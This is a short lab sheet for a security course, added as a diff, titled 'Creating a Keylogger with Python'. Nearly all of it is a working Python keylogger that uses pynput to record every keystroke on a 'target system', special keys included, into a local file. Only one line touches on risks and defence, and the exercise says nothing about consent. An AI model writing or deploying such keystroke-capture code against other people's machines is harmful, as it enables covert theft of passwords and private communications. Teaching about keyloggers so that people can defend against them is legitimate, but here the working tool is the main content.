@@ -1,0 +1,25 @@
+PRACTICAL NO. 7
+AIM: Creating a Keylogger with Python
+ Write a Python script that captures and logs keystrokes from a target
+system.
+ Execute the keylogger script and observe the logged keystrokes.
+ Understand the potential security risks associated with keyloggers
+and the importance of protecting against them.
+Code:
+# keylogger.py
+from pynput import keyboard
+
+log_file = "keystrokes.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")  # Logs normal characters
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f" [{key}] ")  # Logs special keys (Enter, Shift, etc.)
+
+# Listener setup
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+Output: keystrokes.txt 
